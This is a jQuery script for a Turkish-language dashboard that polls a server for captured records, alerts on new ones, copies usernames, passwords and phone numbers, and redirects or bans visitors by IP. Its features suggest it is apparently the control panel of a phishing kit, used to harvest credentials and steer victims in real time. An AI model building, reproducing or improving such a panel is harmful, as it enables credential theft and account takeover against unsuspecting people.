$(document).ready(function () {

    var audio = document.getElementById('notificationSound');

    var records = { old: $("#records").html() }; // Old records initially

    setInterval(function() { send(audio, records); }, 2000);

});


$(document).on("click", ".copyButton", function () {
    var username = $(this).data('username');
    var password = $(this).data('password');
    var phone = $(this).data('phone');
    var textToCopy = username + ' ' + password + ' ' + phone;

    copyToClipboard(textToCopy);
});

function copyToClipboard(text) {
    var tempInput = $("<input>");
    $("body").append(tempInput);
    tempInput.val(text).select();
    document.execCommand("copy");
    tempInput.remove();
}
function send(audio, records) {

    $.ajax({

        type: "POST",

        url: "ajax",

        data: "data=true",

        success: function (res) {

            res = JSON.parse(res);

            $("#online").text(res.online);

            $("#total").text(res.total);

            $("#ban").text(res.ban);



            // If records changed, play the sound

            if (records.old !== res.records) {

                var playPromise = audio.play();

                if (playPromise !== undefined) {

                    playPromise.then(_ => {

                        // Automatic playback started!

                    }).catch(error => {

                        // Automatic playback failed.

                        console.log('Playback failed: ' + error);

                    });

                }

                records.old = res.records; // Update old records

            }



            $("#records").html(res.records);



            // Online user count check

            if (res.online > 0) {

                $(".online-btn").removeClass('btn-outline-secondary').addClass('btn-success');

            } else {

                $(".online-btn").removeClass('btn-success').addClass('btn-outline-secondary');

            }

        }

    });

}



function copy(that) {

    var inp = document.createElement('input');

    document.body.appendChild(inp)

    inp.value = that.textContent

    inp.select();

    document.execCommand('copy', false);

    inp.remove();

}



$(document).on("click", ".remove", function () {

    $.ajax({

        type: "POST",

        url: "ajax",

        data: "remove=true&id=" + $(this).data('id'),

        success: function () {

            send();

        }

    })

}); 



$(document).on("click", ".redirect", function () {

    $.ajax({

        type: "POST",

        url: "ajax",

        data: "redirect=true&page=" + $(this).data('page') + "&ip=" + $(this).data('ip'),

        success: function () {

            send();

        }

    })

});



$(document).on("click", ".ban", function () {

    $.ajax({

        type: "POST",

        url: "ajax",

        data: "ban=true&ip=" + $(this).data('ip'),

        success: function () {

            send();

        }

    })

});



$(document).on("click", "#recordClear", function () {

    Swal.fire({

        title: "Dikkat!",

        text: "Sistemdeki tüm kayıtları silmek istediğinize emin misiniz?",

        icon: "warning",

        showCancelButton: true,

        confirmButtonColor: "#3085d6",

        cancelButtonColor: "#d33",

        confirmButtonText: "Evet, sil!",

        cancelButtonText: "Hayır, iptal et!"

    }).then((result) => {

        if (result.value) {

            $.ajax({

                type: "POST",

                url: "ajax",

                data: "recordClear=true",

                success: function () {

                    send();

                }

            })

        }

    });

});



$(document).on("click", "#offlineClear", function () {

    Swal.fire({

        title: "Dikkat!",

        text: "Sistemdeki tüm çevrimdışı kayıtları silmek istediğinize emin misiniz?",

        icon: "warning",

        showCancelButton: true,

        confirmButtonColor: "#3085d6",

        cancelButtonColor: "#d33",

        confirmButtonText: "Evet, sil!",

        cancelButtonText: "Hayır, iptal et!"

    }).then((result) => {

        if (result.value) {

            $.ajax({

                type: "POST",

                url: "ajax",

                data: "offlineClear=true",

                success: function () {

                    send();

                }

            })

        }

    });

});



$(document).on("click", "#banClear", function () {

    Swal.fire({

        title: "Dikkat!",

        text: "Sistemdeki tüm ban kayıtlarını silmek istediğinize emin misiniz?",

        icon: "warning",

        showCancelButton: true,

        confirmButtonColor: "#3085d6",

        cancelButtonColor: "#d33",

        confirmButtonText: "Evet, sil!",

        cancelButtonText: "Hayır, iptal et!"

    }).then((result) => {

        if (result.value) {

            $.ajax({

                type: "POST",

                url: "ajax",

                data: "banClear=true",

                success: function () {

                    send();

                }

            })

        }

    });

});



